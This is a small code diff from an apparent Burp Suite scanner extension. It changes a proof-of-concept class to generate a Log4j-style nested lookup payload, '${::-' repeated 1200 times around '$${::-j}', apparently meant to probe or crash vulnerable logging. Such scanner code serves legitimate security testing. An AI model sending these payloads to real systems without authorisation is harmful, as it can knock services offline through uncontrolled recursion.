@@ -3,10 +3,10 @@ package burp.poc.impl;
 import burp.poc.IPOC;
 import burp.utils.Utils;
 
-public class POC14 implements IPOC {
+public class POC15 implements IPOC {
     @Override
     public String generate(String domain) {
-        return "${" + "${::-".repeat(300) + "$${::-j}" + "}".repeat(300) + "}";
+        return "${" + "${::-".repeat(1200) + "$${::-j}" + "}".repeat(1200) + "}";
 
     }
 
